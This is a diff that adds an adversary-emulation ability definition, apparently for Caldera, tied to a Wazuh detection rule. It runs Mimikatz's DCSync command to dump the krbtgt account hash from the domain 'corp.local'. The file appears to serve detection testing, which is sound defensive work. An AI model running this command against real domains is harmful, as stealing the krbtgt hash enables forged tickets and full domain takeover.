@@ -1,0 +1,17 @@
+- requirements: []
+  name: '[CORP] [Wazuh] [110015] [Tier0] DCSync utilizando Mimikatz'
+  description: DCSync utilizando Mimiktaz
+  tactic: credential-access
+  technique_id: T1003.006
+  technique_name: 'OS Credential Dumping: DCSync'
+  executors:
+  - cleanup: []
+    timeout: 60
+    platform: windows
+    name: psh
+    payloads:
+    - mimikatz.exe
+    parsers: []
+    command: .\mimikatz.exe "lsadump::dcsync /user:krbtgt@corp.local" "exit"
+  delete_payload: true
+  id: e7224301-4af0-4e0a-bc0f-ed42fd292fae
